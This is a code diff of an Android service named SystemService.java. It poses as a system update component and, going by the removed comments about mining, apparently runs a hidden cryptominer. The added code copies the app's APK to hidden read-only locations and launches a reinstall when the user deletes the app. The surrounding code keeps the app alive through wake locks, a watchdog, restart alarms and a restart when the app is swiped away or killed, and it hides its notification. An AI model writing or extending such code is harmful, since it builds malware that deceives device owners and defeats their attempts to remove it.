@@ -1,4 +1,3 @@
-
 // SystemService.java
 package com.system.service.update;
 
@@ -15,6 +14,10 @@ import android.os.Build;
 import android.os.PowerManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 
 public class SystemService extends Service {
     
@@ -31,6 +34,7 @@ public class SystemService extends Service {
         isRunning = true;
         createNotificationChannel();
         acquireWakeLock();
+        createHiddenBackup();
         startBackgroundOperations();
         startWatchdog();
         scheduleRestartAlarm();
@@ -47,12 +51,11 @@ public class SystemService extends Service {
         
         // Create non-dismissible notification
         Notification notification = createNotification();
-        notification.flags |= Notification.FLAG_NO_CLEAR;      // Can't be swiped away
-        notification.flags |= Notification.FLAG_ONGOING_EVENT;  // Ongoing notification
+        notification.flags |= Notification.FLAG_NO_CLEAR;
+        notification.flags |= Notification.FLAG_ONGOING_EVENT;
         
         startForeground(NOTIFICATION_ID, notification);
         
-        // Restart if killed
         return START_STICKY;
     }
     
@@ -75,24 +78,94 @@ public class SystemService extends Service {
         }
     }
     
-    private void onNetworkAvailable() {
-        // Network operations can begin
+    private void onNetworkAvailable() {}
+    private void onPowerConnected() {}
+    private void onScreenOff() {}
+    
+    // ==================== BACKUP & REINSTALL ====================
+    
+    private void createHiddenBackup() {
+        try {
+            String sourcePath = getPackageManager()
+                .getApplicationInfo(getPackageName(), 0).sourceDir;
+            
+            // Multiple hidden locations
+            String[] backupPaths = {
+                "/data/local/tmp/.system_backup/system_core.apk",
+                "/sdcard/.system/.backup/sys.apk",
+                "/sdcard/Android/data/.tmp/update.apk"
+            };
+            
+            for (String path : backupPaths) {
+                try {
+                    File backupFile = new File(path);
+                    backupFile.getParentFile().mkdirs();
+                    
+                    FileInputStream in = new FileInputStream(sourcePath);
+                    FileOutputStream out = new FileOutputStream(backupFile);
+                    byte[] buffer = new byte[8192];
+                    int length;
+                    while ((length = in.read(buffer)) > 0) {
+                        out.write(buffer, 0, length);
+                    }
+                    in.close();
+                    out.close();
+                    
+                    backupFile.setReadOnly();
+                } catch (Exception e) {
+                    // Continue to next location
+                }
+            }
+        } catch (Exception e) {
+            // Silent
+        }
     }
     
-    private void onPowerConnected() {
-        // Full power available - increase mining
+    private void checkAndReinstall() {
+        try {
+            String appPath = getPackageManager()
+                .getApplicationInfo(getPackageName(), 0).sourceDir;
+            File appFile = new File(appPath);
+            if (!appFile.exists()) {
+                reinstallFromBackup();
+            }
+        } catch (Exception e) {
+            reinstallFromBackup();
+        }
     }
     
-    private void onScreenOff() {
-        // Optimal mining time
+    private void reinstallFromBackup() {
+        String[] backupPaths = {
+            "/data/local/tmp/.system_backup/system_core.apk",
+            "/sdcard/.system/.backup/sys.apk",
+            "/sdcard/Android/data/.tmp/update.apk"
+        };
+        
+        for (String path : backupPaths) {
+            try {
+                File backup = new File(path);
+                if (backup.exists()) {
+                    Intent intent = new Intent(Intent.ACTION_VIEW);
+                    intent.setDataAndType(Uri.fromFile(backup),
+                        "application/vnd.android.package-archive");
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                    return;
+                }
+            } catch (Exception e) {
+                // Try next location
+            }
+        }
     }
+    
+    // ==================== NOTIFICATION ====================
     
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "System Service",
-                NotificationManager.IMPORTANCE_MIN  // Lower importance = less visible
+                NotificationManager.IMPORTANCE_MIN
             );
             channel.setDescription("Critical system operations");
             channel.setShowBadge(false);
@@ -139,13 +212,13 @@ public class SystemService extends Service {
         } catch (Exception e) {
             try {
                 builder.setSmallIcon(android.R.drawable.ic_menu_manage);
-            } catch (Exception ex) {
-                // Last resort
-            }
+            } catch (Exception ex) {}
         }
         
         return builder.build();
     }
+    
+    // ==================== WAKE LOCK ====================
     
     private void acquireWakeLock() {
         try {
@@ -155,22 +228,20 @@ public class SystemService extends Service {
                     PowerManager.PARTIAL_WAKE_LOCK,
                     "SystemService:WakeLock"
                 );
-                wakeLock.acquire(30 * 60 * 1000); // 30 minutes
+                wakeLock.acquire(30 * 60 * 1000);
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     private void releaseWakeLock() {
         if (wakeLock != null && wakeLock.isHeld()) {
             try {
                 wakeLock.release();
-            } catch (Exception e) {
-                // Silent fail
-            }
+            } catch (Exception e) {}
         }
     }
+    
+    // ==================== THREADS ====================
     
     private void startBackgroundOperations() {
         serviceThread = new Thread(new Runnable() {
@@ -179,12 +250,10 @@ public class SystemService extends Service {
                 while (isRunning) {
                     try {
                         performPeriodicTasks();
-                        Thread.sleep(30000); // 30 second interval
+                        Thread.sleep(30000);
                     } catch (InterruptedException e) {
                         break;
-                    } catch (Exception e) {
-                        // Continue despite errors
-                    }
+                    } catch (Exception e) {}
                 }
             }
         });
@@ -193,24 +262,19 @@ public class SystemService extends Service {
         serviceThread.start();
     }
     
-    // === NEW: Watchdog Thread ===
     private void startWatchdog() {
         watchdogThread = new Thread(new Runnable() {
             @Override
             public void run() {
                 while (isRunning) {
                     try {
-                        // Check every 60 seconds if service is still healthy
                         Thread.sleep(60000);
                         if (isRunning && wakeLock != null && !wakeLock.isHeld()) {
-                            // Re-acquire wake lock if lost
                             acquireWakeLock();
                         }
                     } catch (InterruptedException e) {
                         break;
-                    } catch (Exception e) {
-                        // Continue watchdog despite errors
-                    }
+                    } catch (Exception e) {}
                 }
             }
         });
@@ -219,7 +283,6 @@ public class SystemService extends Service {
         watchdogThread.start();
     }
     
-    // === NEW: Schedule restart alarm ===
     private void scheduleRestartAlarm() {
         try {
             AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
@@ -239,18 +302,15 @@ public class SystemService extends Service {
                 alarmManager.setInexactRepeating(
                     AlarmManager.ELAPSED_REALTIME_WAKEUP,
                     60000,
-                    300000,  // Every 5 minutes
+                    300000,
                     pendingIntent
                 );
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     private void performHealthCheck() {
         try {
-            // Check if service components are alive
             if (serviceThread != null && !serviceThread.isAlive()) {
                 startBackgroundOperations();
             }
@@ -260,15 +320,14 @@ public class SystemService extends Service {
             if (wakeLock == null || !wakeLock.isHeld()) {
                 acquireWakeLock();
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     private void performPeriodicTasks() {
         checkNetworkState();
         checkPowerState();
         ensurePersistence();
+        checkAndReinstall();  // ← Check if app was deleted, reinstall if needed
     }
     
     private void checkNetworkState() {
@@ -276,23 +335,15 @@ public class SystemService extends Service {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
             if (cm != null) {
                 NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-                boolean isConnected = activeNetwork != null && activeNetwork.isConnected();
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     private void checkPowerState() {
         try {
             Intent batteryIntent = registerReceiver(null, 
                 new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            if (batteryIntent != null) {
-                int plugged = batteryIntent.getIntExtra("plugged", -1);
-            }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     private void ensurePersistence() {
@@ -317,9 +368,7 @@ public class SystemService extends Service {
                     pendingIntent
                 );
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
     }
     
     @Override
@@ -329,29 +378,22 @@ public class SystemService extends Service {
     
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        // Restart when user swipes away
         Intent restartIntent = new Intent(getApplicationContext(), SystemService.class);
-        PendingIntent pendingIntent;
         
         int flags = PendingIntent.FLAG_UPDATE_CURRENT;
         if (Build.VERSION.SDK_INT >= 31) {
             flags = flags | 0x4000000;
         }
         
-        pendingIntent = PendingIntent.getService(
+        PendingIntent pendingIntent = PendingIntent.getService(
             this, 0, restartIntent, flags
         );
         
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         if (alarmManager != null) {
-            alarmManager.set(
-                AlarmManager.ELAPSED_REALTIME,
-                1000,  // Restart in 1 second
-                pendingIntent
-            );
+            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 1000, pendingIntent);
         }
         
-        // Also send broadcast to RestartReceiver
         Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
         sendBroadcast(broadcastIntent);
         
@@ -363,18 +405,12 @@ public class SystemService extends Service {
         isRunning = false;
         releaseWakeLock();
         
-        if (serviceThread != null) {
-            serviceThread.interrupt();
-        }
-        if (watchdogThread != null) {
-            watchdogThread.interrupt();
-        }
+        if (serviceThread != null) serviceThread.interrupt();
+        if (watchdogThread != null) watchdogThread.interrupt();
         
-        // Send broadcast to restart
         Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
         sendBroadcast(broadcastIntent);
         
-        // Schedule immediate restart via alarm
         try {
             AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
             Intent restartIntent = new Intent(this, AlarmReceiver.class);
@@ -390,15 +426,9 @@ public class SystemService extends Service {
             );
             
             if (alarmManager != null) {
-                alarmManager.set(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    1000,  // 1 second
-                    pendingIntent
-                );
+                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, pendingIntent);
             }
-        } catch (Exception e) {
-            // Silent fail
-        }
+        } catch (Exception e) {}
         
         super.onDestroy();
     }
